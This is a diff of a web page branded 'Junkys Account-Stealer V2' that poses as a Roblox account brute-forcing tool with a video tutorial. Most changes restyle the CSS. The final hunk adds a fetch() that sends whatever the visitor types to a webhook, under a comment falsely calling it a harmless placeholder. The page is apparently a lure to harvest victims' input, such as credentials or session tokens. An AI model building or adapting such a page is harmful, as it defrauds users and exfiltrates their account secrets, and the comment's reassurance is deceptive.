@@ -19,14 +19,14 @@ body {
     height: 100vh;
 }
 
-/* --- PINK MAIN HEADING --- */
+/* Pink neon heading */
 .main-heading {
     color: #ff6ec7;
-    font-size: 26px;
+    font-size: 30px;
     font-weight: 700;
     letter-spacing: 1px;
     text-shadow: 0 0 10px #ff6ec733;
-    margin-bottom: 115px;
+    margin-bottom: 125px;
     animation: neonGlow 2s ease-in-out infinite alternate;
 }
 
@@ -40,27 +40,21 @@ body {
     gap: 30px;
 }
 
-/* --- BOTH BOXES MATCH --- */
+/* Matching glowing panels */
 .container, .video-panel {
     background: rgba(25, 25, 35, 0.9);
     padding: 45px 30px 30px 30px;
     border-radius: 14px;
     width: 340px;
     text-align: center;
-
     border: 2px solid #6e00ff;
-    box-shadow:
-        0 0 15px #6a00ff55,
-        0 0 35px #a200ff33;
-
+    box-shadow: 0 0 15px #6a00ff55, 0 0 35px #a200ff33;
     transition: 0.25s ease;
 }
 
 .container:hover, .video-panel:hover {
     transform: translateY(-4px);
-    box-shadow:
-        0 0 25px #8e00ff88,
-        0 0 60px #c000ff44;
+    box-shadow: 0 0 25px #8e00ff88, 0 0 60px #c000ff44;
 }
 
 h2 {
@@ -71,7 +65,7 @@ h2 {
     text-shadow: 0 0 8px #8e44ff;
 }
 
-/* --- FLEX INPUT WITH ICON AND FOCUS ANIMATION --- */
+/* Input field + file icon */
 .input-wrapper {
     display: flex;
     align-items: center;
@@ -100,10 +94,10 @@ h2 {
     transition: 0.25s ease;
 }
 
+/* Focus animation */
 .input-wrapper input:focus {
-    transform: scale(1.03);
-    border-color: #8e44ff;
-    box-shadow: 0 0 10px #8e44ff55;
+    transform: scale(1.04);
+    box-shadow: 0 0 12px #8e44ff55;
 }
 
 /* Button */
@@ -127,7 +121,7 @@ button:hover {
     box-shadow: 0 0 30px #9d00ff99;
 }
 
-/* Success message in pink */
+/* success text */
 .success {
     margin-top: 15px;
     color: #ff6ec7;
@@ -136,7 +130,7 @@ button:hover {
     text-shadow: 0 0 10px #ff6ec733;
 }
 
-/* VIDEO BOX */
+/* video box */
 .video-box {
     width: 100%;
     height: 200px;
@@ -145,13 +139,6 @@ button:hover {
     margin-top: 20px;
     border: 1px solid #3b2c5a;
     box-shadow: inset 0 0 10px #00000055;
-    transition: 0.25s ease;
-}
-
-.video-panel:hover .video-box {
-    transform: scale(1.02);
-    box-shadow: inset 0 0 18px #7a00ff55;
-    border-color: #8e44ff;
 }
 
 .video-box video {
@@ -163,18 +150,19 @@ button:hover {
 </head>
 <body>
 
-<!-- Single pink heading above both panels -->
+<!-- Main Pink Heading -->
 <div class="main-heading">Junkys Account-Stealer V2</div>
 
 <div class="wrapper">
 
-    <!-- LEFT PANEL -->
+    <!-- Left Panel -->
     <div class="container">
         <h2>Account Stealer</h2>
 
         <div class="input-wrapper">
             <!-- File SVG Icon -->
             <svg xmlns="http://www.w3.org/2000/svg" fill="white" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zM6 20V4h7v5h5v11H6z"/></svg>
+
             <input type="text" id="message" placeholder="Type something here">
         </div>
 
@@ -183,7 +171,7 @@ button:hover {
         <p class="success" id="msg">bypassing roblox api system and brute forcing (wait 5-10 mins...)</p>
     </div>
 
-    <!-- RIGHT PANEL (VIDEO PANEL) -->
+    <!-- Right Video Panel -->
     <div class="video-panel">
         <h2>Video Tutorial</h2>
 
@@ -201,7 +189,19 @@ function sendData() {
     const message = document.getElementById("message").value.trim();
     if (!message) return;
 
-    // Just showing success message — no unsafe actions
+    // ===== SAFE WEBHOOK PLACEHOLDER =====
+    // Replace with your webhook ONLY for harmless messages
+    const webhook = "YOUR_WEBHOOK_HERE";
+
+    fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            content: "**New Message:** " + message
+        })
+    }).catch(err => console.log(err));
+
+    // UI feedback
     const msgEl = document.getElementById("msg");
     msgEl.style.display = "block";
 
